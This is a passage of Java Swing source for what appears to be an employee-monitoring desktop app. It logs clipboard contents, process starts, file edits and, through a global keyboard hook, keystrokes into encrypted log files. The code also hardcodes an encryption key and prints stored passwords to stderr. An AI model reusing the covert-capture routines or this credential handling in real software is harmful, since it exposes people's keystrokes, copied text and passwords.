                    StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)) {
                writer.println();
                writer.print(EncryptionDemo.encrypt("[" + dateString2 + "]" + " Program Terminated By \"" + usercombobox.getSelectedItem().toString() + "\"", ""));
                //       writer.print(EncryptionDemo.encrypt("[" + dateString2 + "]",""));
            } catch (Exception e) {

            }
            n.SetLogin(usercombobox.getSelectedItem().toString(), "Logged Out");
            setVisible(false);
            System.exit(0);
        } else {
            JOptionPane.showMessageDialog(null, "You should login in by admin in order to close");
        }
    }//GEN-LAST:event_jLabel6MouseClicked
public void LogOut()
{
  
}    public String current;
    public ExecutorService service = Executors.newFixedThreadPool(4);
    public Runnable rstop = new Runnable() {
        @Override
        public void run() {
            while (flag) {
                try {
                    Thread.sleep(300);
                } catch (InterruptedException ex) {
                    //   Logger.getLogger(Test3.class.getName()).log(Level.SEVERE, null, ex);
                }
                try {
                    String line;
                    String pidInfo = "";

                    Process p = Runtime.getRuntime().exec(System.getenv("windir") + "\\system32\\" + "tasklist.exe");

                    BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));

                    while ((line = input.readLine()) != null) {
                        pidInfo += line;
                    }

                    input.close();

                    if (!pidInfo.contains("EXCEL.EXE") && excel == true) {
                        excel = false;
                        writetolog("Microsoft Excel Has stopped");
                        ifclos();

                    }
                    if (!pidInfo.contains("WINWORD.EXE") && word == true) {
                        writetolog("Microsoft Word Has stopped");

                        ifclos();
                        word = false;
                        CheckChanges();

                    } else if (!pidInfo.contains("chrome.exe") && chrome == true) {
                        writetolog("Google Chrome Has stopped");
                        ifclos();
                        chrome = false;

                    }
                } catch (Exception ex) {

                }
            }

        }
    };
    public volatile boolean clipflag = false;
    public Runnable clip = new Runnable() {
        @Override
        public void run() {
            String initial = "";
            while (clipflag) {
                try {
                    Clipboard c = Toolkit.getDefaultToolkit().getSystemClipboard();
                    String paste = c.getContents(null).getTransferData(DataFlavor.stringFlavor).toString();
                    if (!paste.equals(initial)) {
                        System.out.println("Copied Items : " + paste);
                        writetolog("Copied Items : " + paste);
                        initial = paste;
                    }
                } catch (UnsupportedFlavorException | IOException ex) {
                    //  Logger.getLogger(TestClipboard.class.getName()).log(Level.SEVERE, null, ex);
                }
                try {
                    Thread.sleep(400);
                } catch (InterruptedException ex) {
                }
            }

        }
    };

    public boolean button = false;
    public boolean excel = false;

    public static boolean contain(String senten, String search) {
        boolean flag1 = false;
        int st = 0;
        int end = search.length();
        String test = "";
        for (int i = 0; i < senten.length(); i++) {
            try {
                test = senten.substring(st, end);
                if (test.equals(search)) {
                    flag1 = true;
                    break;
                }
                st++;
                if (end != senten.length()) {
                    end++;
                }
            } catch (Exception e) {
                System.out.println(i);
            }
        }
        st = 0;
        end = 1;
        test = "";
        boolean flag2 = true;
        for (int i = 0; i < senten.length(); i++) {
            try {
                test = senten.substring(st, end);
                if (test.equals("$")) {
                    flag2 = false;
                    break;
                }
                st++;
                if (end != senten.length()) {
                    end++;
                }
            } catch (Exception e) {
                System.out.println(i);
            }
        }
        return flag1 && flag2;
    }
    public String[] store = null;
    public int[] size = null;
    
    public void Store() {

        try (Stream<Path> walk = Files.walk(Paths.get(Files.readAllLines(Paths.get("Path.in")).get(1)))) {
            List<String> result = walk.filter(Files::isRegularFile)
                    .map(x -> x.toString()).collect(Collectors.toList());
            String arr[] = new String[result.size()];

            arr = result.toArray(new String[0]);
            for (int i = 0; i < arr.length; i++) {
                if (!contain(arr[i], ".doc") || !contain(arr[i], ".docx") || !contain(arr[i], ".xlsx") || !contain(arr[i], ".in")) {
                    arr[i] = "NO";
                }
            }
            List<String> list2 = new ArrayList<String>(Arrays.asList(arr));
            for (int i = 0; i < arr.length; i++) {
                list2.remove("NO");
            }
            arr = list2.toArray(new String[0]);
            store = arr;
            int size[] = new int[arr.length];
            for (int i = 0; i < arr.length; i++) {
                File n = new File(arr[i]);
                size[i] = (int) n.length();
            }
            this.size = size;
        } catch (IOException e) {
            e.printStackTrace();
        }

    }
    volatile boolean shutdown = false;
    public Runnable modify = new Runnable() {
        @Override
        public void run() {
            // throw new UnsupportedOperationException("Not supported yet."); //To change body of generated methods, choose Tools | Templates.
            while (!shutdown) {
                int size2[] = new int[size.length];
                for (;;) {
                    try {
                        Thread.sleep(400);
                    } catch (InterruptedException ex) {
                        Logger.getLogger(NewJFrame.class.getName()).log(Level.SEVERE, null, ex);
                    }
                    for (int i = 0; i < store.length; i++) {
                        File n = new File(store[i]);
                        size2[i] = (int) n.length();
                        if (size[i] != size2[i]) {
                            writetolog("File : \"" + n.getName() + "\" Located In \"" + n.getParent() + "\" Has been Modified , Current Size in bytes " + n.length());
                            System.out.println(n.getName() + " w ");
                            size[i] = size2[i];
                        }
                    }
                }
            }
        }

    };
    public boolean word = false;
    public boolean chrome = false;
    public Runnable rstart = new Runnable() {
        @Override
        public void run() {
            while (flag) {
                try {
                    Thread.sleep(300);
                } catch (InterruptedException ex) {
                    //Logger.getLogger(Test3.class.getName()).log(Level.SEVERE, null, ex);
                }
                try {
                    String line;
                    String pidInfo = "";

                    Process p = Runtime.getRuntime().exec(System.getenv("windir") + "\\system32\\" + "tasklist.exe");

                    BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));

                    while ((line = input.readLine()) != null) {
                        pidInfo += line;
                    }

                    input.close();

                    if (pidInfo.contains("EXCEL.EXE") && excel == false) {
                        writetolog("Microsoft Excel Has started");
                        excel = true;
                        ifclos();

                    } else if (pidInfo.contains("WINWORD.EXE") && word == false) {
                        writetolog("Microsoft Word Has started");

                        word = true;
                        ifclos();
                        LoopForCheck();

                    } else if (pidInfo.contains("chrome.exe") && chrome == false) {
                        writetolog("Google Chrome Has started");
                        chrome = true;
                        ifclos();

                    }
                } catch (Exception ex) {

                }
            }

        }
    };

    /**
     * @param args the command line arguments
     */
    boolean flag = true;

    public void ifopen() {

        service.execute(rstart);
    }

    public void ifclos() {
        //  ExecutorService service = Executors.newFixedThreadPool(4);
        service.execute(rstop);

    }

    public void writetolog(String s) {
        DateFormat dateFormat2 = new SimpleDateFormat("dd/MM/yyyy hh.mm aa");// Create a date object
        String dateString2 = dateFormat2.format(new Date()).toString();

        Path pth = Paths.get(pathh);
        try (OutputStream os = Files.newOutputStream(pth, StandardOpenOption.CREATE, StandardOpenOption.WRITE,
                StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)) {
            writer.println();
            System.err.println(s);
            writer.println(EncryptionDemo.encrypt("[" + dateString2 + "] " + s, ""));
            writer.print(EncryptionDemo.encrypt("[" + dateString2 + "]", ""));
            //   writer.print(EncryptionDemo.encrypt("[" + dateString2 + "]",""));
        } catch (Exception e) {

        }
    }
    public String OpenedPath = "";
    public boolean modifyflag = false;
    public String[] docx = null;

    public boolean GatherWhichDoc(String s) {

        File file = new File(s);

        File sameFileName = new File(s);

        if (file.renameTo(sameFileName)) {
            // if the file is renamed
            return false;
        } else {
            // if the file didnt accept the renaming operation
            return true;
        }

    }
    public String[] openedContent = null;

    public void OpenedPath(String s) throws FileNotFoundException, IOException {
        File file = new File(s);
        FileInputStream fis = new FileInputStream(file.getAbsolutePath());
        XWPFDocument document = new XWPFDocument(fis);
        List<XWPFParagraph> paragraphs = document.getParagraphs();
        String[] ss = new String[paragraphs.size()];
        int x = 0;
        for (XWPFParagraph para : paragraphs) {
            ss[x] = para.getText();
            x++;
        }
        List<String> list2 = new ArrayList<String>(Arrays.asList(ss));
        for (int i = 0; i < ss.length; i++) {
            list2.remove("");
        }
        openedContent = ss;
        currentFile = s;
        fis.close();

    }
    public String currentFile = "";

    public void CheckChanges() throws FileNotFoundException, IOException {
        try {
            File file = new File(currentFile);
            FileInputStream fis = new FileInputStream(file.getAbsolutePath());
            XWPFDocument document = new XWPFDocument(fis);
            List<XWPFParagraph> paragraphs = document.getParagraphs();
            String[] ss = new String[paragraphs.size()];
            int x = 0;
            for (XWPFParagraph para : paragraphs) {
                ss[x] = para.getText();
                x++;
            }

            for (int i = 0; i < ss.length; i++) {
                try {
                    if (!openedContent[i].equals(ss[i])) {

                        writetolog("Docx File Change Catched \"" + file.getName() + "\" Changed is : " + ss[i]);

                    }
                } catch (ArrayIndexOutOfBoundsException e) {
                    System.err.println("A7");
                }
            }
            fis.close();
        } catch (Exception E) {
            E.printStackTrace();
        }

    }

    public void LoopForCheck() throws IOException {
        try {
            for (int i = 0; i < docx.length; i++) {
                if (GatherWhichDoc(docx[i])) {
                    OpenedPath(docx[i]);

                }
            }
        } catch (Exception E) {
            E.printStackTrace();
        }

    }

    public void PrepareDocs() {
        try (Stream<Path> walk = Files.walk(Paths.get(Files.readAllLines(Paths.get("Path.in")).get(1)))) {
            List<String> result = walk.filter(Files::isRegularFile)
                    .map(x -> x.toString()).collect(Collectors.toList());
            String arr[] = new String[result.size()];
            arr = result.toArray(new String[0]);
            for (int i = 0; i < arr.length; i++) {
                if (!contain(arr[i], ".docx")) {
                    arr[i] = "RMV";
                }
            }
            List<String> temp = new ArrayList<String>(Arrays.asList(arr));
            for (int i = 0; i < arr.length; i++) {
                temp.remove("RMV");
            }
            docx = temp.toArray(new String[0]);
        } catch (Exception e) {

        }
    }
    public MYSQL n = new MYSQL();
    public String[] passget() throws IOException {
       return n.get(1);
    }
    public boolean SkipDoc = false;
    public void Login()
    {
                try {
            ///refresh location////
            pathh = EncryptionDemo.decrypt(Files.readAllLines(Paths.get("Path.in")).get(0), key);
        } catch (Exception ex) {
            Logger.getLogger(NewJFrame.class.getName()).log(Level.SEVERE, null, ex);
        }
        try {
            if(n.isLogged(usercombobox.getSelectedItem().toString()))
                JOptionPane.showMessageDialog(null,"You are already logged in with another computer , please log out of any other computers");
            else
            {
            n.isLogged(usercombobox.getSelectedItem().toString());
            if ((int) Files.lines(Paths.get("Path.in")).count() == 1 && !usercombobox.getSelectedItem().toString().equals("Admin")) {
                JOptionPane.showMessageDialog(this, "Watcher location not defined \n contact admin for more info");
            } else {
                if (!(pathh.contains("null")) || !("".equals(pathh))) {
                    if (jLabel5.getText().contains("Logged Out") || jLabel5.getText().contains("Wrong")) {
                        if ("Choose Users".equals(usercombobox.getSelectedItem().toString())) {
                            JOptionPane.showMessageDialog(null, "Please select user");
                        } else if ("Running".equals(jLabel2.getText())) {
                            JOptionPane.showMessageDialog(null, "Already Logged In");
                        } else {
                            try {
                                String pass[] = passget();
                                System.err.println(pass[usercombobox.getSelectedIndex()]);
                                if (pass[usercombobox.getSelectedIndex()].equals(passwordfield.getText())) {
                                    if (usercombobox.getSelectedItem().toString().equals("Admin")) {
                                        admin = true;
                                        log.setText("Settings");
                                    }
                                    passwordfield.setEnabled(false);
                                    passwordfield.setText("");
                                    if (admin == false) {

                                        try {
                                            GlobalScreen.registerNativeHook();
                                        } catch (NativeHookException e) {
                                            //logger.error(e.getMessage(), e);
                                            System.exit(-1);
                                        }
                                    }
                                    PrepareDocs();
                                    if (button == false) {
                                        ifopen();
                                        button = true;
                                        flag = true;
                                    }
                                     
                                    modifyflag = true;
                                    if ((int) Files.lines(Paths.get("Path.in")).count() != 1) {
                                        Store();
                                    }
                                    if(n.getCatch())
                                    service.execute(modify);
                                    n.SetLogin(usercombobox.getSelectedItem().toString(), "Logged in");
                                    jLabel5.setText("Logged in by " + usercombobox.getSelectedItem().toString());
                                    usercombobox.setEnabled(false);
                                    writetolog("User Signed in \"" + usercombobox.getSelectedItem().toString() + "\"");
                                    clipflag = true;
                                    if(n.getClip())
                                    service.execute(clip);

                                    if (admin == false) {
                                        jLabel2.setText("Running");
                                        jLabel2.setForeground(Color.GREEN);
                                    } else {
                                        jLabel2.setText("Admin Login");
                                        jLabel2.setForeground(Color.ORANGE);
                                    }
                                    current = new SimpleDateFormat("HH:mm:ss").format(new Date());
                                    sin.setEnabled(false);
                                    sout.setEnabled(true);
                                    if (admin == false) {

                                    }
                                } else {
                                    jLabel5.setText("Wrong password for \"" + usercombobox.getSelectedItem().toString() + "\"");
                                }

                            } catch (Exception ex) {
                                // Logger.getLogger(NewJFrame.class.getName()).log(Level.SEVERE, null, ex);
                            }

                        }
                    } else {
                        JOptionPane.showMessageDialog(null, "Your Are logged in");
                    }
                } else {
                    JOptionPane.showMessageDialog(null, "The path is incorrent \n contact admin for assistance");
                }
            }
            }
        } catch (IOException ex) {
            Logger.getLogger(NewJFrame.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
    
    private void jLabel9MouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jLabel9MouseClicked
        JOptionPane.showMessageDialog(null, "Unpublished work \n \u00a9 2019 Ahmed Saadawey \n All Rights Reserved");
    }//GEN-LAST:event_jLabel9MouseClicked

    private void jButton7ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton7ActionPerformed

        usercombobox.setModel(new  DefaultComboBoxModel(n.get(2)));
    }//GEN-LAST:event_jButton7ActionPerformed

    private void jLabel12MouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jLabel12MouseClicked
        Change n = new Change("Employee");
        n.setVisible(true);
    }//GEN-LAST:event_jLabel12MouseClicked

    private void jLabel12MouseMoved(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jLabel12MouseMoved
        //   jLabel12.setForeground(Color.red);
    }//GEN-LAST:event_jLabel12MouseMoved

    private void jLabel12MouseDragged(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jLabel12MouseDragged

        //     jLabel12.setForeground(Color.white);
    }//GEN-LAST:event_jLabel12MouseDragged

    private void showActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_showActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_showActionPerformed

    private void showMouseReleased(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_showMouseReleased
        // TODO add your handling code here:

        passwordfield.setEchoChar('*');
    }//GEN-LAST:event_showMouseReleased

    private void showMousePressed(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_showMousePressed
        passwordfield.setEchoChar((char) 0);
    }//GEN-LAST:event_showMousePressed

    private void jButton5ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton5ActionPerformed
        restart();
    }//GEN-LAST:event_jButton5ActionPerformed

    private void logActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_logActionPerformed

        if (jLabel5.getText().contains("Logged in")) {
            if (admin == false) {
                try {
                    ///refresh location////
                    pathh = EncryptionDemo.decrypt(Files.readAllLines(Paths.get("Path.in")).get(0), key);
                } catch (Exception ex) {
                    Logger.getLogger(NewJFrame.class.getName()).log(Level.SEVERE, null, ex);
                }
                Path file = Paths.get(pathh);
                File file2 = new File(pathh);
                if (file2.isFile()) {
                    DateFormat dateFormat2 = new SimpleDateFormat("dd/MM/yyyy hh.mm aa");// Create a date object
                    String dateString2 = dateFormat2.format(new Date()).toString();
                    Path pth = Paths.get(pathh);
                    try (OutputStream os = Files.newOutputStream(pth, StandardOpenOption.CREATE, StandardOpenOption.WRITE,
                        StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)) {
                    writer.println();
                    writer.println(EncryptionDemo.encrypt("[" + dateString2 + "]" + " Log Windows initiated by \"" + usercombobox.getSelectedItem().toString() + "\"", this.key));
                    writer.print(EncryptionDemo.encrypt("[" + dateString2 + "]", ""));
                    GlobalScreen.unregisterNativeHook();
                } catch (Exception e) {

                }
                Password p = new Password();
                p.setVisible(true);
                p.path = pathh;
                try {
                    p.cmp = usercombobox.getSelectedIndex();
                } catch (Exception ex) {
                    Logger.getLogger(NewJFrame.class.getName()).log(Level.SEVERE, null, ex);
                }
                p.Curr = usercombobox.getSelectedItem().toString();

            } else {
                JOptionPane.showMessageDialog(null, "Check Your Path \n contact Admin");
            }
        } else {
            Admin p = new Admin();
            p.setVisible(true);

        }
        } else {
            JOptionPane.showMessageDialog(null, "Please Sign in");
        }
    }//GEN-LAST:event_logActionPerformed

    private void sinActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_sinActionPerformed
        Login();
    }//GEN-LAST:event_sinActionPerformed

    private void soutActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_soutActionPerformed
        // TODO add your handling code here:
        if ("Stopped".equals(jLabel2.getText())) {
            JOptionPane.showMessageDialog(null, "Already Stopped");
        } else {
            String[] options = {"Confirm", "No"};
            int x = JOptionPane.showOptionDialog(null, "Sure ?",
                "Click a button",
                JOptionPane.DEFAULT_OPTION, JOptionPane.INFORMATION_MESSAGE, null, options, options[0]);
            //if(EncryptionDemo.decrypt(Files.readAllLines(Paths.get("pass.inA")).get(jComboBox1.getSelectedIndex()), "").equals(jPasswordField2.getText()))
            switch (x) {
                case 0: {
                    try {
                        if (admin) {
                            admin = false;
                            log.setText("Open Log");
                        }
                        if (button) {
                            button = false;
                            flag = false;
                        }
                        passwordfield.setText("");
                        passwordfield.setEnabled(true);
                        String cur = new SimpleDateFormat("HH:mm:ss").format(new Date());
                        SimpleDateFormat format = new SimpleDateFormat("HH:mm:ss");
                        Date date1 = format.parse(current);
                        Date date2 = format.parse(cur);
                        shutdown = true;
                        sin.setEnabled(true);
                        sout.setEnabled(false);
                        n.SetLogin(usercombobox.getSelectedItem().toString(), "Logged out");
                        long difference = date2.getHours() - date1.getHours();
                        long minutes = date2.getMinutes() - date1.getMinutes();

                        jLabel2.setText("Stopped");
                        jLabel5.setText("Logged Out by " + usercombobox.getSelectedItem().toString() + ",Logged time " + difference + " Hours & " + minutes + " Mins");
                        usercombobox.setEnabled(true);
                        jLabel2.setForeground(Color.RED);
                        DateFormat dateFormat2 = new SimpleDateFormat("dd/MM/yyyy hh.mm aa");// Create a date object
                        String dateString2 = dateFormat2.format(new Date()).toString();
                        writetolog(" Logged Out by User \"" + usercombobox.getSelectedItem().toString() + "\"");
                        writetolog(" Total Logged Time is" + difference + " Hours & " + minutes + " Mins");
                        //            writer.println(cryptoUtil.encrypt("---------", this.key));
                        jLabel10.setText("Last Login " + new SimpleDateFormat("hh.mm aa").format(new Date()));
                        clipflag = false;
                        JOptionPane.showMessageDialog(null, "Done Mr " + usercombobox.getSelectedItem().toString() + " Total Logged Time is " + difference + " Hours & " + minutes + " Mins");
                        GlobalScreen.getInstance().removeNativeKeyListener(keyHook);
                        GlobalScreen.unregisterNativeHook();
                    } catch (ParseException ex) {
                        Logger.getLogger(NewJFrame.class.getName()).log(Level.SEVERE, null, ex);

                    }
                }

            }

        }
    }//GEN-LAST:event_soutActionPerformed

    private void passwordfieldKeyPressed(java.awt.event.KeyEvent evt) {//GEN-FIRST:event_passwordfieldKeyPressed
        boolean isOn = Toolkit.getDefaultToolkit().getLockingKeyState(KeyEvent.VK_CAPS_LOCK);
        if (isOn) {
            jLabel3.setText("Caps Lock Is On");
        } else {
            jLabel3.setText("Caps Lock Is Off");
        }
        if(evt.getKeyCode()==KeyEvent.VK_ENTER)
        Login();
    }//GEN-LAST:event_passwordfieldKeyPressed

    private void usercomboboxActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_usercomboboxActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_usercomboboxActionPerformed

    private void usercomboboxMousePressed(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_usercomboboxMousePressed
        // TODO add your handling code here:
    }//GEN-LAST:event_usercomboboxMousePressed

    private void usercomboboxPopupMenuWillBecomeInvisible(javax.swing.event.PopupMenuEvent evt) {//GEN-FIRST:event_usercomboboxPopupMenuWillBecomeInvisible

    }//GEN-LAST:event_usercomboboxPopupMenuWillBecomeInvisible

    private void deleteActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_deleteActionPerformed
        // TODO add your handling code here:
        if ("".equals(jTextArea1.getText())) {
            JOptionPane.showMessageDialog(null, "Empty Field");
        } else {
            Path file = Paths.get(pathh);
            DateFormat dateFormat2 = new SimpleDateFormat("dd/MM/yyyy hh.mm aa");// Create a date object
            String dateString2 = dateFormat2.format(new Date()).toString();
            try (OutputStream os = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE,
                StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)) {
            writer.println();

            writer.print(cryptoUtil.encrypt("[" + dateString2 + "] " + "Deleted Info by \"" + usercombobox.getSelectedItem().toString() + "\" Info  :- " + jTextArea1.getText(), this.key));
            writer.println();
            //     writer.println(cryptoUtil.encrypt("---------", this.key));
            jTextArea1.setText("");
            //  JOptionPane.showMessageDialog(null, "Done");
            restart();
        } catch (Exception e) {
            JOptionPane.showMessageDialog(null, "Unexpected Error \n Doube check the path ");
        }
        }
    }//GEN-LAST:event_deleteActionPerformed

    private void jTextArea1KeyPressed(java.awt.event.KeyEvent evt) {//GEN-FIRST:event_jTextArea1KeyPressed
        try {

            GlobalScreen.unregisterNativeHook();
            GlobalScreen.getInstance().removeNativeKeyListener(this);
            GlobalScreen.getInstance().removeNativeKeyListener(keyHook);
            if (flagg == false) {
                flagg = true;

            }
        } catch (Exception ex) {
            Logger.getLogger(NewJFrame.class.getName()).log(Level.SEVERE, null, ex);
        }
        if (admin == false) {
            jLabel2.setText("Stopped");
            jLabel2.setForeground(Color.RED);
        }
    }//GEN-LAST:event_jTextArea1KeyPressed

    private void jTextArea1InputMethodTextChanged(java.awt.event.InputMethodEvent evt) {//GEN-FIRST:event_jTextArea1InputMethodTextChanged
        // TODO add your handling code here:
    }//GEN-LAST:event_jTextArea1InputMethodTextChanged
   private void SetButton(Color e)
   {
       usercombobox.setBackground(e);
       sout.setBackground(e);
       sin.setBackground(e);
       log.setBackground(e);
       show.setBackground(e);
       delete.setBackground(e);
   }
      private void SetFont(Color e)
   {
    usercombobox.setForeground(e);
       sout.setForeground(e);
       sin.setForeground(e);
       log.setForeground(e);
       show.setForeground(e);
       delete.setForeground(e);
       jLabel7.setForeground(e);
       jLabel8.setForeground(e);
       jLabel14.setForeground(e);
   }
    private void jButton9ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton9ActionPerformed
Color button = new Color(46, 49, 49);     
     SetButton(button);
     Color font = new Color(255,255,255);
        SetFont(font);
     Color mainpanel =new Color(58, 45, 45);
     this.mainpanel.setBackground(mainpanel);
     Color header =new Color(103, 128, 159);
     this.header.setBackground(header);
    }//GEN-LAST:event_jButton9ActionPerformed
    public void setcustom(Color button,Color font , Color main , Color header)
    {
        SetButton(button);
        SetFont(font);
        this.mainpanel.setBackground(main);
         this.header.setBackground(header);
    }
    private void jButton10ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton10ActionPerformed
    Color button = new Color(233, 212, 96);     
    Color font=new Color(58, 45, 45);
    Color mainpanel =new Color(1, 152, 117);
    Color header =new Color(103, 128, 159);   
    SetButton(button);
    SetFont(font);
    this.mainpanel.setBackground(mainpanel);
    this.header.setBackground(header);
    
    }//GEN-LAST:event_jButton10ActionPerformed

    private void jButton1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton1ActionPerformed
        Color newColor = JColorChooser.showDialog(null, "Choose a color", Color.RED);
        jButton1.setBackground(newColor);
        SetButton(newColor);
              
    }//GEN-LAST:event_jButton1ActionPerformed

    private void jButton2ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton2ActionPerformed
             Color newColor = JColorChooser.showDialog(null, "Choose a color", Color.RED);
        jButton2.setBackground(newColor);
           this.header.setBackground(newColor);
    }//GEN-LAST:event_jButton2ActionPerformed

    private void jButton3ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton3ActionPerformed
        // TODO add your handling code here:
                     Color newColor = JColorChooser.showDialog(null, "Choose a color", Color.RED);
        jButton3.setBackground(newColor);
           SetFont(newColor);
    }//GEN-LAST:event_jButton3ActionPerformed

    private void jButton4ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton4ActionPerformed
             Color newColor = JColorChooser.showDialog(null, "Choose a color", Color.RED);
        jButton4.setBackground(newColor);     
        this.mainpanel.setBackground(newColor);
        // TODO add your handling code here:
    }//GEN-LAST:event_jButton4ActionPerformed

    private void jButton8ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton8ActionPerformed
        setcustom(new Color(70,167,255), new Color(255,255,255), new Color(44,62,80),new Color(235,149,50));
    }//GEN-LAST:event_jButton8ActionPerformed

    private void jButton10MouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jButton10MouseClicked

       
    }//GEN-LAST:event_jButton10MouseClicked
    private boolean shows=true;
    private void jButton6ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton6ActionPerformed
        // TODO add your handling code here:
        if(shows)
        {
            shows=false;
            jPanel4.setVisible(shows);
        }
        else
        {
            shows=true;
            jPanel4.setVisible(shows);
        }
    }//GEN-LAST:event_jButton6ActionPerformed
// public String user =""
    /**
     */
    //public static String pathh="";
    public String user;
    public static String pathh = "";
    private static Cipher ecipher;
    private static Cipher dcipher;
    public EncryptionDemo cryptoUtil = new EncryptionDemo();
    public String key = "ezeon8547";

    public static void main(String args[]) {

        /* Set the Nimbus look and feel */
        //<editor-fold defaultstate="collapsed" desc=" Look and feel setting code (optional) ">
        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.
         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html 
         */
        try {
            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                if ("Nimbus".equals(info.getName())) {
                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException | InstantiationException | IllegalAccessException | javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(NewJFrame.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }
        //</editor-fold>

        //</editor-fold>

        /* Create and display the form */
        java.awt.EventQueue.invokeLater(new Runnable() {
            public void run() {
                //     Watcher n = new Watcher();

                EncryptionDemo cryptoUtil = new EncryptionDemo();
                File export = new File("Path.in");
                if (export.canRead()) {
                    try {
                        String temp = EncryptionDemo.decrypt(Files.readAllLines(Paths.get("Path.in")).get(0), "");
                        pathh = temp;
                        //       File file = new File(pathh);
                        //   FileChannel channel = new RandomAccessFile(file, "rw").getChannel();

                        // Use the file channel to create a lock on the file.
                        // This method blocks until it can retrieve the lock.
                        // FileLock lock = channel.lock();
                    } catch (Exception ex) {
                        Logger.getLogger(NewJFrame.class.getName()).log(Level.SEVERE, null, ex);
                    }

                } else {

                }
                //     jComboBox1.setModel(yy);
                new NewJFrame().setVisible(true);
                /*               File file = new File("temp.in");
                File file2 = new File("temp2.in");
                try {
                    file.createNewFile();
                } catch (IOException ex) {
                    Logger.getLogger(NewJFrame.class.getName()).log(Level.SEVERE, null, ex);
                }
                Path pth = Paths.get("temp.in");
                 try (OutputStream os = Files.newOutputStream(pth, StandardOpenOption.CREATE, StandardOpenOption.WRITE,
                    StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)) {
                     writer.println("7ss");
                     writer.println("7ssA");
                 
                
                 }
                 catch(IOException e)
                 {
                     
                 }
                try {
                    Files.setAttribute(pth, "dos:hidden", true);
                        file.renameTo(file2);
                    
                    // Set's the window to be "always on top"
                } catch (IOException ex) {
                    Logger.getLogger(NewJFrame.class.getName()).log(Level.SEVERE, null, ex);
                }
                try
               
                 */
                DateFormat dateFormat2 = new SimpleDateFormat("dd/MM/yyyy hh.mm aa");// Create a date object
                String dateString2 = dateFormat2.format(new Date()).toString();
                Path pth = Paths.get(pathh);
                try (OutputStream os = Files.newOutputStream(pth, StandardOpenOption.CREATE, StandardOpenOption.WRITE,
                        StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)) {
                    writer.println();
                    writer.print(EncryptionDemo.encrypt("[" + dateString2 + "]" + " Program Initiated", ""));
                    //       writer.print(EncryptionDemo.encrypt("[" + dateString2 + "]",""));
                } catch (Exception e) {

                }
                GlobalScreen.getInstance().addNativeKeyListener(new NewJFrame());
              
                
            
                
            }
        }
        );
    }

    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JButton delete;
    private javax.swing.JPanel header;
    private javax.swing.JButton jButton1;
    private javax.swing.JButton jButton10;
    private javax.swing.JButton jButton2;
    private javax.swing.JButton jButton3;
    private javax.swing.JButton jButton4;
    private javax.swing.JButton jButton5;
    private javax.swing.JButton jButton6;
    private javax.swing.JButton jButton7;
    private javax.swing.JButton jButton8;
    private javax.swing.JButton jButton9;
    private javax.swing.JLabel jLabel1;
    private javax.swing.JLabel jLabel10;
    private javax.swing.JLabel jLabel11;
    private javax.swing.JLabel jLabel12;
    private javax.swing.JLabel jLabel13;
    private javax.swing.JLabel jLabel14;
    private javax.swing.JLabel jLabel2;
    private javax.swing.JLabel jLabel3;
    private javax.swing.JLabel jLabel4;
    private javax.swing.JLabel jLabel5;
    private javax.swing.JLabel jLabel6;
    private javax.swing.JLabel jLabel7;
    private javax.swing.JLabel jLabel8;
    private javax.swing.JLabel jLabel9;
    private javax.swing.JPanel jPanel4;
    private javax.swing.JScrollPane jScrollPane1;
    private javax.swing.JSeparator jSeparator1;
    private javax.swing.JTextArea jTextArea1;
    private javax.swing.JButton log;
    private javax.swing.JPanel mainpanel;
    private javax.swing.JPasswordField passwordfield;
    private javax.swing.JButton show;
    private javax.swing.JButton sin;
    private javax.swing.JButton sout;
    private javax.swing.JPanel statuspanel;
    private javax.swing.JComboBox<String> usercombobox;
    private org.jdesktop.beansbinding.BindingGroup bindingGroup;
    // End of variables declaration//GEN-END:variables

    public boolean ctrl = false;
    public NativeKeyListener keyHook;
//GlobalScreen.unregisterNativeHook();

    @Override
    public void nativeKeyPressed(NativeKeyEvent nke) {
